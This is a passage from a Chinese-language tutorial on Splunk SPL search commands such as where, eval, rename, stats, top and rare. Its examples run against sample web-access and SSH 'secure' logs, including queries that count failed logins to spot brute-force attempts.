&lt;eval-mathematical-expression&gt; | &lt;eval-concatenate-expression&gt; | &lt;eval-comparison-expression&gt; | &lt;eval-boolean-expression&gt; | &lt;eval-function-call&gt;</span><br><span class="line">描述: 由值、变量、运算符和函数组成的表达式，表示目标字段的值.参见用法.</span><br><span class="line"><span class="comment"># &lt;eval-expression&gt; 是区分大小写的.在运行搜索之前会检查 eval 表达式的语法，对于无效的表达式会抛出异常.</span></span><br></pre></td></tr></table></figure><p><code>Where</code>命令使用与<code>eval</code>命令相同的表达式语法.此外，这两个命令都将带引号的字符串解释为文字.如果该字符串未加引号，则将其视为字段名.因此，您可以使用<code>Where</code>命令来比较两个不同的字段，这是<code>search</code>命令不能完成的.</p><table><thead><tr><th>命令</th><th>示例</th><th>描述</th></tr></thead><tbody><tr><td>where</td><td><code>where ipaddress=clientip</code></td><td>查找字段 <code>ipaddress</code> 等于字段 <code>clientip</code> 的事件.</td></tr><tr><td>search</td><td><code>search host=www2</code></td><td>查找字段 <code>host</code> 包含字符串值 <code>www2</code> 的事件</td></tr><tr><td>where</td><td><code>where host=&quot;www2&quot;</code></td><td>查找字段 <code>host</code> 中的值为字符串值 <code>www2</code> 的事件.</td></tr></tbody></table><p><code>Where</code>并且可以像<code>Mysql</code>数据库那样使用<a href="https://docs.splunk.com/Documentation/Splunk/9.2.2/SearchReference/CommonEvalFunctions#Function_list_by_category">Like命令</a>来模糊匹配</p><p><code>like</code> 函数允许使用百分号<code>%</code>作为通配符，来匹配任意数量的字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 ipaddress 字段的值以198.开始的事件</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | <span class="built_in">where</span> like(ipaddress, <span class="string">&quot;198.%&quot;</span>)</span><br><span class="line"><span class="comment"># 查找IP地址或子网的事件</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | <span class="built_in">where</span> like(src, <span class="string">&quot;10.9.165.%&quot;</span>) OR cidrmatch(<span class="string">&quot;10.9.165.0/25&quot;</span>, dst)</span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | <span class="built_in">where</span> uri like <span class="string">&quot;%admin%&quot;</span></span><br></pre></td></tr></table></figure><h4 id="uniq、dedup"><a href="#uniq、dedup" class="headerlink" title="uniq、dedup"></a>uniq、dedup</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 描述: uniq 命令会根据事件的完整内容进行去重，如果两个事件在所有字段上的值都相同，它们将被视为重复并被移除.</span></span><br><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="built_in">uniq</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | <span class="built_in">uniq</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 描述: 根据特定字段进行去重</span></span><br><span class="line"><span class="comment"># 语法</span></span><br><span class="line">dedup filed1 filed2</span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | dedup uri ip</span><br></pre></td></tr></table></figure><h4 id="accum"><a href="#accum" class="headerlink" title="accum"></a>accum</h4><p>对于每个事件,其中 <code>field</code> 是一个数字, <code>accum</code> 命令计算运行总数或数字之和.累计的总和可以返回到相同的字段或您指定的 <code>newfield</code> .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">accum &lt;field&gt; [AS &lt;newfield&gt;]</span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">field</span><br><span class="line">    语法: &lt;字符串&gt;</span><br><span class="line">    描述: 要计算累计和的字段名称.该字段必须包含数值.</span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line">newfield</span><br><span class="line">    语法: &lt;字符串&gt;</span><br><span class="line">    描述: 要将结果放置在的新字段名称.</span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">假设我们有一个包含销售数据的日志,其中有一个字段名为 response_time ,我们想计算这个字段的累计和,并将结果放在一个新字段</span><br><span class="line">cumulative_response_time  中,可以使用以下命令:</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> status=200 | accum response_time as cumulative_response_time | table ip,uri,cumulative_response_time</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181642112.png" data-fancybox="true"/></div></div><h3 id="数据提取与转换命令"><a href="#数据提取与转换命令" class="headerlink" title="数据提取与转换命令"></a>数据提取与转换命令</h3><h4 id="regex"><a href="#regex" class="headerlink" title="regex"></a>regex</h4><p><a href="https://docs.splunk.com/Documentation/Splunk/9.2.2/SearchReference/Regex">搜索与指定正则表达式匹配或不匹配的结果</a></p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>eval 命令能帮你计算东西并把结果放到搜索结果里.如果结果里没有指定的字段则会新建一个字段,如果结果里已经有这个字段，它会用新计算的结果替换原来的值.<br>eval 命令可以处理数字、文字和逻辑判断.</p><p>如果想连续用多个 eval 命令可以用逗号分割，它会按顺序执行，并且后面的命令可以用前面命令的结果.</p><mark class="tag-plugin colorful mark" color="warning">eval和stats命令的区别 stats 命令是用来统计事件中的字段数据的，而 eval 命令则是通过已有字段和表达式来创建新字段</mark><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="built_in">eval</span> &lt;field&gt;=&lt;expression&gt;[<span class="string">&quot;,&quot;</span> &lt;field&gt;=&lt;expression&gt;]...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">field</span><br><span class="line">    语法: &lt;字符串&gt;</span><br><span class="line">    描述: 用于存放计算结果的目标字段名称.如果该字段名称已存在于事件中，<span class="built_in">eval</span> 会覆盖其值.</span><br><span class="line">expression</span><br><span class="line">    语法: &lt;字符串&gt;</span><br><span class="line">    描述: 由值、变量、运算符和函数组成的组合，用于执行计算以确定放入目标字段的值.</span><br><span class="line">    <span class="built_in">eval</span> 表达式是区分大小写的.在运行搜索之前会检查 <span class="built_in">eval</span> 表达式的语法，对于无效的表达式会抛出异常.</span><br><span class="line">    * <span class="built_in">eval</span> 表达式的结果不能是布尔值.</span><br><span class="line">    * 如果在搜索时，对于某个事件无法成功评估表达式，<span class="built_in">eval</span> 命令会清除结果字段.</span><br><span class="line">    * 如果表达式引用的字段名称包含非字母数字字符(下划线 _ 除外），则该字段名称需要用单引号包围.例如，如果字段名称是 server</span><br></pre></td></tr></table></figure><h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><ol><li><p>创建包含计算结果的新字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在每个事件中创建一个名为 velocity 的新字段.通过将距离字段中的值除以时间字段中的值来计算速度.</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">eval</span> velocity=distance/time</span><br></pre></td></tr></table></figure></li><li><p>使用if函数分析字段值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在每个事件中创建一个名为 attack 的字段.如果 action值为Failed password，则使用 if 功能将 attack 字段中的值设置为Yes,否则为No</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> |<span class="built_in">eval</span> attack  = <span class="keyword">if</span>(action == <span class="string">&quot;Failed password&quot;</span>, <span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>)| table action,attack</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407191513288.png" data-fancybox="true"/></div></div></li><li><p>将状态设置为一些简单的http错误代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | <span class="built_in">eval</span> status_msg = <span class="keyword">case</span>(status == 404, <span class="string">&quot;Not found&quot;</span>, status == 500, <span class="string">&quot;Internal Server Error&quot;</span>, status == 200, <span class="string">&quot;OK&quot;</span>) | table status,status_msg</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407191513491.png" data-fancybox="true"/></div></div></li></ol><h4 id="rename"><a href="#rename" class="headerlink" title="rename"></a>rename</h4><p>使用 rename 命令来重命名一个或多个字段.这个命令对于给字段赋予更有意义的名称非常有用，例如将 “pid” 改为 “Product ID”.如果你想重命名名称相似的字段，可以使用通配符.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">rename &lt;wc-field&gt; AS &lt;wc-field&gt;.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">wc-field</span><br><span class="line">Syntax: &lt;string&gt;</span><br><span class="line">字段的名称和要替换它的名称.包含空格的字段名称必须用引号括起来.你可以使用星号(*）作为通配符来指定具有相似名称的字段列表.例如，如果你想指定所有以 <span class="string">&quot;value&quot;</span> 开头的字段，可以使用类似 value* 的通配符.</span><br></pre></td></tr></table></figure><h5 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h5><ol><li><p>如果字段名称为短语时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用双引号将短语包裹起来</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | rename status AS <span class="string">&quot;The Web_logs Status&quot;</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407191527990.png" data-fancybox="true"/></div></div></li><li><p>多个名称相似的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将以下字段的EU修改为EMEA</span></span><br><span class="line"><span class="comment"># EU_UK</span></span><br><span class="line"><span class="comment"># EU_DE</span></span><br><span class="line"><span class="comment"># EU_PL</span></span><br><span class="line">| rename EU* AS EMEA*</span><br><span class="line"><span class="comment"># 修改后的内容</span></span><br><span class="line"><span class="comment"># EMEA_UK</span></span><br><span class="line"><span class="comment"># EMEA_DE</span></span><br><span class="line"><span class="comment"># EMEA_PL</span></span><br></pre></td></tr></table></figure></li><li><p>修改需转义的字段名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如http\\:8000重命名为localhost:8000</span></span><br><span class="line">| rename http\\\\:* AS localhost:*</span><br></pre></td></tr></table></figure></li><li><p>修改包含空格的字段名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| rename count AS <span class="string">&quot;Count of Events&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="数据聚合与统计命令"><a href="#数据聚合与统计命令" class="headerlink" title="数据聚合与统计命令"></a>数据聚合与统计命令</h3><h4 id="stats"><a href="#stats" class="headerlink" title="stats"></a>stats</h4><p>计算结果集的聚合统计信息，如平均值、计数和总和.这类似于SQL聚合.如果在没有 <code>BY</code> 子句的情况下使用 <code>stats</code> 命令，则仅返回一行，这是整个传入结果集的聚合.如果使用 <code>BY</code> 子句，则为 <code>BY</code> 子句中指定的每个非重复值返回一行.</p><mark class="tag-plugin colorful mark" color="error">注意!!! stats 命令根据事件中的字段计算统计信息.eval命令通过使用现有字段和任意表达式在事件中创建新字段</mark><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法</span></span><br><span class="line">stats (stats-function(field) [AS field])... [BY field-list]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完整语法</span></span><br><span class="line">| stats <span class="comment"># 必须</span></span><br><span class="line">[partitions=&lt;num&gt;]</span><br><span class="line">[allnum=&lt;bool&gt;]</span><br><span class="line">[delim=&lt;string&gt;]</span><br><span class="line">( &lt;stats-agg-term&gt;... | &lt;sparkline-agg-term&gt;... ) <span class="comment"># 必须</span></span><br><span class="line">[&lt;by-clause&gt;]</span><br><span class="line">[&lt;dedup_splitvals&gt;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">stats-agg-term</span><br><span class="line">    语法: &lt;stats-func&gt;(&lt;evaled-field&gt; | &lt;wc-field&gt;) [AS &lt;wc-field&gt;]</span><br><span class="line">    描述: 一个统计聚合函数.参考统计函数选项.该函数可以应用于一个 <span class="built_in">eval</span> 表达式，或一个字段或一组字段.使用 AS 子句将结果放入一个你指定名称的新字段中.你可以在字段名称中使用通配符.更多关于 <span class="built_in">eval</span> 表达式的信息，请参阅《搜索手册》中的 <span class="built_in">eval</span> 表达式类型.</span><br><span class="line">sparkline-agg-term</span><br><span class="line">    语法: &lt;sparkline-agg&gt; [AS &lt;wc-field&gt;]</span><br><span class="line">    描述: 一个迷你图聚合函数.使用 AS 子句将结果放入一个你指定名称的新字段中.你可以在字段名称中使用通配符.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line">allnum</span><br><span class="line">    语法: allnum=&lt;bool&gt;</span><br><span class="line">    描述: 如果为 <span class="literal">true</span>，则仅当该字段的所有值都是数值时，才对该字段计算数值统计.</span><br><span class="line">    默认值: <span class="literal">false</span></span><br><span class="line">by-clause</span><br><span class="line">    语法: BY &lt;field-list&gt;</span><br><span class="line">    描述: 一个或多个字段名称，用于分组.你不能使用通配符来指定多个名称相似的字段.你必须单独指定每个字段.BY 子句为 BY 子句字段中的每个不同值返回一行.如果没有指定 BY 子句，stats 命令只返回一行，这是对整个传入结果集的聚合.</span><br><span class="line">dedup_splitvals</span><br><span class="line">    语法: dedup_splitvals=&lt;boolean&gt;</span><br><span class="line">    描述: 指定是否在多值 BY 子句字段中去除重复值.</span><br><span class="line">    默认值: <span class="literal">false</span></span><br><span class="line">delim</span><br><span class="line">    语法: delim=&lt;string&gt;</span><br><span class="line">    描述: 指定 list() 或 values() 聚合中的值的分隔符.</span><br><span class="line">    默认值: 单个空格</span><br><span class="line">partitions</span><br><span class="line">    语法: partitions=&lt;num&gt;</span><br><span class="line">    描述: 基于分割字段对输入数据进行分区，以便进行多线程归约.partitions 参数在同一搜索进程的同一台机器上使用多个线程运行归约步骤(并行归约处理）.与之相比，使用 redistribute 命令的并行归约在多台机器上并行运行归约步骤.</span><br><span class="line">    当 partitions=0 时，partitions 参数的值与 limits.conf 文件中的 default_partitions 设置相同.</span><br><span class="line">    默认值: 0.设置为与 limits.conf 文件中的 default_partitions 设置相同的值，默认情况下为 1.</span><br></pre></td></tr></table></figure><h5 id="统计函数选项"><a href="#统计函数选项" class="headerlink" title="统计函数选项"></a>统计函数选项</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stats-function</span><br><span class="line">语法:语法取决于你使用的函数.</span><br><span class="line">描述:可以与 stats 命令一起使用的统计和图表函数.每次调用 stats 命令时，你可以使用一个或多个函数.不过，你只能使用一个 BY 子句.</span><br></pre></td></tr></table></figure><p>下表列出了按函数类型分类的支持函数.使用表中的链接可以查看每个函数的描述和示例.关于与命令一起使用函数的概述，请参见统计和图表函数.</p><table><thead><tr><th align="center">函数类型</th><th align="center">支持的函数和语法</th></tr></thead><tbody><tr><td align="center"><a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/SearchReference/Aggregatefunctions">聚合函数</a></td><td align="center"><code>avg()</code> <code>count()</code> <code>distinct_count()</code> <code>estdc()</code> <code>estdc_error()</code> <code> exactperc&lt;num&gt;()</code> <code>max()</code> <code>median()</code> <code>min()</code> <code>mode()</code> <code>perc&lt;num&gt;()</code> <code>range()</code> <code>stdev()</code> <code>stdevp()</code> <code>sum()</code> <code>sumsq()</code> <code>upperperc&lt;num&gt;()</code> <code>var()</code> <code>varp()</code></td></tr><tr><td align="center"><a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/SearchReference/Eventorderfunctions">事件顺序函数</a></td><td align="center"><code>first()</code> <code>last()</code></td></tr><tr><td align="center"><a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/SearchReference/Multivaluefunctions">多值统计和图表函数</a></td><td align="center"><code>list()</code> <code>values()</code></td></tr><tr><td align="center"><a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/SearchReference/Timefunctions">时间函数</a></td><td align="center"><code>earliest()</code> <code>earliest_time()</code> <code>latest()</code> <code>latest_time()</code> <code>rate()</code></td></tr></tbody></table><h5 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h5><ol><li><p>统计不同状态码的分布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | search status IN(200,301,302,404,501) | stats count BY status | <span class="built_in">sort</span> - count</span><br></pre></td></tr></table></figure><p>​<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407200924828.png" data-fancybox="true"/></div></div></p></li><li><p>分析 HTTP 响应时间，识别是否有异常的响应时间.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | stats avg(response_time) BY uri</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407200924261.png" data-fancybox="true"/></div></div></li><li><p>统计每个 IP 地址的访问次数，识别可能的攻击者 IP.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span>  |stats count by ip | <span class="built_in">sort</span> - count</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407200924961.png" data-fancybox="true"/></div></div></li><li><p>检测某个用户的登录尝试次数，识别是否有暴力破解行为.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> | search action = <span class="string">&quot;Failed password&quot;</span> | stats count by user | <span class="built_in">sort</span> - count</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407200923881.png" data-fancybox="true"/></div></div></li><li><p>单一账号，5分钟内超过20次登录失败</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> | search action = <span class="string">&quot;Failed password&quot;</span> | bucket _time span=5m | stats count by user,source_ip</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407200923765.png" data-fancybox="true"/></div></div></li></ol><h4 id="top"><a href="#top" class="headerlink" title="top"></a>top</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找字段列表中最常见的值.计算这些值在事件中出现的频率计数和百分比.如果包含 &lt;by-clause&gt;，则结果按你在 &lt;by-clause&gt; 中指定的字段进行分组.</span></span><br><span class="line"><span class="comment"># 语法:</span></span><br><span class="line">top [&lt;N&gt;] [&lt;top-options&gt;...] &lt;field-list&gt; [&lt;by-clause&gt;]</span><br><span class="line"><span class="comment"># 必须参数</span></span><br><span class="line">&lt;field-list&gt;</span><br><span class="line">    语法: &lt;field&gt;, &lt;field&gt;, ...</span><br><span class="line">    描述: 逗号分隔的字段名称列表.</span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line">&lt;N&gt;</span><br><span class="line">    语法: &lt;int&gt;</span><br><span class="line">    描述: 要返回的结果数量.</span><br><span class="line">    默认值: 10</span><br><span class="line">    </span><br><span class="line">&lt;top-options&gt;</span><br><span class="line">    语法: countfield=&lt;string&gt; | <span class="built_in">limit</span>=&lt;int&gt; | otherstr=&lt;string&gt; | percentfield=&lt;string&gt; | showcount=&lt;bool&gt; | showperc=&lt;bool&gt; | useother=&lt;bool&gt;</span><br><span class="line">    描述: top 命令的选项. 参考 Top 选项.</span><br><span class="line">    </span><br><span class="line">&lt;by-clause&gt;</span><br><span class="line">    语法: BY &lt;field-list&gt;</span><br><span class="line">    描述: 一个或多个字段名称，用于分组.</span><br></pre></td></tr></table></figure><h5 id="top选项"><a href="#top选项" class="headerlink" title="top选项"></a>top选项</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Top 选项</span></span><br><span class="line">countfield</span><br><span class="line">    语法: countfield=&lt;string&gt;</span><br><span class="line">    描述: 对于 top 命令返回的每个值，结果还会返回具有该值的事件的计数.此参数指定包含计数的字段的名称.计数默认返回.如果不希望返回事件的计数，请指定 showcount=<span class="literal">false</span>.</span><br><span class="line">    默认值: count</span><br><span class="line"></span><br><span class="line"><span class="built_in">limit</span></span><br><span class="line">    语法: <span class="built_in">limit</span>=&lt;int&gt;</span><br><span class="line">    描述: 指定要返回多少结果.要返回所有值，请指定零 (0).指定 top <span class="built_in">limit</span>=&lt;int&gt; 与指定 top N 相同.</span><br><span class="line">    默认值: 10</span><br><span class="line"></span><br><span class="line">otherstr</span><br><span class="line">    语法: otherstr=&lt;string&gt;</span><br><span class="line">    描述: 如果 useother=<span class="literal">true</span>，则会在结果中添加一行，代表所有其他值.使用 otherstr=&lt;string&gt; 指定该行的标签名称.</span><br><span class="line">    默认值: OTHER</span><br><span class="line"></span><br><span class="line">percentfield</span><br><span class="line">    语法: percentfield=&lt;string&gt;</span><br><span class="line">    描述: 对于 top 命令返回的每个值，结果还会返回具有该值的事件的百分比.此参数指定包含百分比的字段的名称.百分比默认返回.如果不希望返回事件的百分比，请指定 showperc=<span class="literal">false</span>.</span><br><span class="line">    默认值: percent</span><br><span class="line"></span><br><span class="line">showcount</span><br><span class="line">    语法: showcount=&lt;bool&gt;</span><br><span class="line">    描述: 指定是否创建一个名为 <span class="string">&quot;count&quot;</span> 的字段(参见 <span class="string">&quot;countfield&quot;</span> 选项），其中包含该元组的计数.</span><br><span class="line">    默认值: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">showperc</span><br><span class="line">    语法: showperc=&lt;bool&gt;</span><br><span class="line">    描述: 指定是否创建一个名为 <span class="string">&quot;percent&quot;</span> 的字段(参见 <span class="string">&quot;percentfield&quot;</span> 选项），其中包含该元组的相对流行度.</span><br><span class="line">    默认值: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">useother</span><br><span class="line">    语法: useother=&lt;bool&gt;</span><br><span class="line">    描述: 指定是否添加一行，代表由于限制截止而未包括的所有值.</span><br><span class="line">    默认值: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h5 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h5><ol><li><p>返回字段的20个最常见值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户名</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> | search action = <span class="string">&quot;Failed password&quot;</span>| top <span class="built_in">limit</span>=20 user</span><br><span class="line"><span class="comment"># 攻击IP</span></span><br><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> | search action = <span class="string">&quot;Failed password&quot;</span>| top <span class="built_in">limit</span>=20 source_ip</span><br></pre></td></tr></table></figure></li><li><p>按 <code>user</code>字段分组，并计算 <code>source_ip</code>的频率</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;secure&quot;</span> | search action = <span class="string">&quot;Failed password&quot;</span>| top source_ip by user</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407201105167.png" data-fancybox="true"/></div></div></li></ol><h4 id="rare"><a href="#rare" class="headerlink" title="rare"></a>rare</h4><p>显示字段中最不常用的值.</p><h5 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h5><ol><li><p>返回字段中不常见的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | rare 20 uri</span><br></pre></td></tr></table></figure></li><li><p>返回按uri字段中不常见的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span>=<span class="string">&quot;shop_access.log&quot;</span> | rare ip by uri</span><br></pre></td></tr></table></figure></li></ol><h3 id="数据转换与操作命令"><a href="#数据转换与操作命令" class="headerlink" title="数据转换与操作命令"></a>数据转换与操作命令</h3><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p><code>table</code> 命令返回一个仅由参数中指定的字段组成的表.列的显示顺序与字段的指定顺序相同.列标题是字段名称.是字段值.每一行代表一个事件.</p><p><code>table</code> 命令类似于 <code>fields</code> 命令，因为它允许您指定要在结果中保留的字段.当你想保留表格格式的数据时，使用 <code>table</code> 